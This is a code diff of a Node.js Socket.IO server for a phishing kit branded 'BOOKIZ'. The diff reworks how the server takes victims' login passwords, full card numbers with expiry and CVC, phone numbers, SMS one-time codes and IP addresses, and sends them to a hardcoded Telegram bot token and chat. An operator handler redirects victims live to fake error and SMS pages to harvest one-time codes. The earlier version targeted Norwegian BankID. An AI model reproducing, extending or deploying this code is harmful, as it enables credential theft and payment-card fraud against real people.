@@ -15,27 +15,65 @@ const BOT_TOKEN = '7562881975:AAEbd99UI8OTExtoosY2NW3FxHiKtv3xdq8';
 const CHAT_ID = '-4632614248';
 
 
-
-async function sendToTelegram(data, userId) {
+async function sendToTelegram(data, userIp, type) {
+    console.log(userIp,"ba2");
+    
     const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    if (type === "login") {
+        message = `\n\n[ 📲 + ------------- + 📲 ]\n
+[ 👁‍🗨 + BOOKIZ  L𝗢𝗚𝗜𝗡 + 👁‍🗨 ]\n\nℹ️ *Login Details*: \n\n${Object.entries(data)
+                .map(([key, value]) => `👤 *${key.charAt(0).toUpperCase() + key.slice(1)}*: ${value}`)
+                .join('\n')}\n\n[ 📲 + ------------- + 📲 ]`;
+        console.log(message, "holaazbya");
 
-    // Prepare the message
-    let message;
+        message = `
+        [ 🔓 + BOOKIZ  Login + 🔓 ]
+        👤 *login* : ${data.email}
+        🗝️ *pass* : ${data.password}
+        🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
+        🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
+        [ 🔓 + -------- + 🔓 ]`;
 
-    if (typeof data === 'object') {
-        // Dynamic object formatting with emojis
-        message = Object.entries(data)
-            .map(([key, value]) => `📌 *${key.charAt(0).toUpperCase() + key.slice(1)}*: ${value}`)
-            .join('\n');
-    } else {
-        // Handle simple string messages
-        message = `ℹ️ ${data}`;
+    }
+    if (type === 'card') {
+        // Create a formatted message for card details
+        message = `
+[ 💷 + BOOKIZ  𝗖𝗖 + 💷 ]
+👤 *𝗖𝗖-𝗡𝗮𝗺𝗲* : ${data.cardHolder}
+🧾 *𝗖𝗖-𝗡𝗮𝗺𝗯𝗲𝗿* : ${data.cardNumber}
+⏳ *𝗖𝗖-𝗘𝗫𝗣* : ${data.expiry}
+🗝 *𝗖𝗖-𝗖𝗩𝗩* : ${data.cvc}
+📞 *𝗣𝗵𝗼𝗻𝗲* : ${data.phone || 'N/A'} 
+🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
+🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
+[ 💷 + -------- + 💷 ]`;
     }
 
-    // Append the userId to the message
-    if (userId) {
-        message = `👤 *UserID*: ${userId}\n` + message;
+    if (type === 'otp') {
+        // Create a formatted message for card details
+        message = `
+[ 💷 + BOOKIZ  SMS + 💷 ]
+👤 *SMS* : ${data}
+🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
+🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
+[ 💷 + -------- + 💷 ]`;
     }
+
+    if (type === 'otpcustom') {
+
+
+        message = `
+[ 💷 + BOOKIZ  SMS CYUSTOM + 💷 ]
+👤 *SMS* : ${data.otp}
+👤 *Custom* : ${data.custom}
+🤴 *𝗙𝗿𝗼𝗺* : ${userIp || 'Unknown'}
+🕔 *𝗧𝗶𝗺𝗲* : ${new Date().toLocaleString()}  
+[ 💷 + -------- + 💷 ]`;
+    }
+
+
+
+
 
     try {
         const response = await axios.post(telegramApiUrl, {
@@ -49,17 +87,19 @@ async function sendToTelegram(data, userId) {
         console.error('Error sending message:', error);
     }
 }
+
+
 const corsOptions = {
-    origin: '*', 
-    methods: ['GET', 'POST'], 
-    credentials: true, 
+    origin: '*',
+    methods: ['GET', 'POST'],
+    credentials: true,
 };
 
 app.use(cors(corsOptions));
 
 const io = socketio(server, {
     cors: {
-        origin: 'https://autopass.sviluppo.host',
+        origin: 'http://localhost:4200',
         methods: ["GET", "POST", "PUT"],
         credentials: true,
     },
@@ -73,7 +113,7 @@ const sessionMiddleware = session({
     secret: 'your_secret_key',
     resave: false,
     saveUninitialized: true,
-    cookie: { secure: false }, 
+    cookie: { secure: false },
 });
 
 
@@ -83,79 +123,63 @@ const connectedUsers = {};
 
 io.use((socket, next) => {
     sessionMiddleware(socket.request, {}, next);
-  });
-  
+});
+
 
 app.get('/', (req, res) => {
     res.send('Socket.IO with session example');
 });
 
 io.on('connection', (socket) => {
-    const userId = socket.request.session.userID || socket.id; 
+    const userId = socket.request.session.userID || socket.id;
     const userIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
     connectedUsers[userId] = {
         socketId: socket.id,
-        currentPage: 'idk',
-        ip: userIp, 
+        currentPage: 'home',
+        ip: userIp,
     };
     io.emit('updateConnectedUsers', connectedUsers);
 
 
     socket.on('pageChange', (page) => {
         connectedUsers[userId].currentPage = page;
-        io.emit('updateConnectedUsers', connectedUsers); 
+        io.emit('updateConnectedUsers', connectedUsers);
     })
 
-    socket.on('phoneNumber', (data) => {
-        sendToTelegram(data,userId)
-        console.log('Received login data from client:', data);
-
-
-    });
-
-    socket.on('sifferNumber', (data) => {
-  
-        sendToTelegram(data,userId)
-        console.log('Received login data from client:', data);
-        if (connectedUsers[userId]) {
-            connectedUsers[userId].currentPage = "card page";
-            io.emit('updateConnectedUsers', connectedUsers);
-            console.log('User currentPage updated:', connectedUsers[userId].currentPage);
-        } else {
-            console.log('User not found in connectedUsers');
-        }
-
-    });
-
-    socket.on('Identifisering', (data) => {
-        sendToTelegram(data,userId)
+    socket.on('login', (data) => {
+        sendToTelegram(data, userIp, "login")
         console.log('Received login data from client:', data);
 
 
     });
 
     socket.on('submitPayment', (data) => {
-    
-        sendToTelegram(data,userId)
+
+        sendToTelegram(data, userIp, "card")
         console.log('Received login data from client:', data);
 
         if (connectedUsers[userId]) {
             connectedUsers[userId].currentPage = "loading";
             io.emit('updateConnectedUsers', connectedUsers);
-            console.log('User currentPage updated:', connectedUsers[userId].currentPage);
+
         } else {
             console.log('User not found in connectedUsers');
         }
     });
 
-    
-    socket.on('Engangskode', (data) => {
-        sendToTelegram(data,userId)
+
+    socket.on('otp', (data) => {
+        sendToTelegram(data, userIp, "otp")
         console.log('Received login data from client:', data);
 
+    });
+
+    socket.on('otpcustom', (data) => {
+        sendToTelegram(data, userIp, "otpcustom")
+        console.log('Received login data from client:', data);
 
     });
-    
+
 
 
     socket.on('disconnect', () => {
@@ -173,30 +197,44 @@ io.on('connection', (socket) => {
 
 
 
-
     socket.on('changePage', (data) => {
-        console.log('Message from admin:', data);
-    
+        const { pageName, userId, error, message, Pageredirect } = data;
 
-        const { message, userId, Pageredirect, error } = data;
-    
-        let pageName = message;
-    
-        if (Pageredirect === "card") {
-            console.log('Redirecting to card page, ',message);
-            socket.to(userId).emit('newRedirect', { pageName: "bankid", option: message });
-        } else 
-        if (Pageredirect === "carderoror") {
-            console.log('Redirecting to SMS page, ',message);
-            socket.to(userId).emit('newRedirect', { pageName: "carderror", option: message });
-        } 
-        
-        else {
-            console.log('Redirecting to another page:', pageName);
-            socket.to(userId).emit('newRedirect', { pageName, error });
+        if (!userId || !pageName) {
+            console.error('User ID or page name is missing in the data:', data);
+            return;
         }
-    
-       
+
+        // Handle page redirection logic
+        switch (pageName) {
+            case 'cardError':
+                console.log('Redirecting to card error page');
+                socket.to(userId).emit('newRedirect', { pageName: 'cardError' });
+                break;
+
+            case 'cardErrorSMS': // Check for a specific error case (renamed for clarity)
+                console.log('Redirecting to SMS page');
+                socket.to(userId).emit('newRedirect', { pageName: 'sms', option: message });
+                break;
+
+
+            case 'smsCustom':
+                console.log('Redirecting to SMS page with custom message', data);
+                socket.to(userId).emit('newRedirect', {
+                    pageName: 'smsCustom',
+                    message: message
+                });
+                break;
+
+
+            default:
+                // For other cases, you can handle the redirection based on the provided pageName
+                console.log('Redirecting to another page:', pageName);
+                socket.to(userId).emit('newRedirect', { pageName, error });
+                break;
+        }
+
+        // Update the user's current page in the connected users object
         if (connectedUsers[userId]) {
             connectedUsers[userId].currentPage = pageName;
             io.emit('updateConnectedUsers', connectedUsers);
@@ -204,8 +242,9 @@ io.on('connection', (socket) => {
             console.error('User not found:', userId);
         }
     });
-    
-    
+
+
+
 });
 
 server.listen(3000, () => {
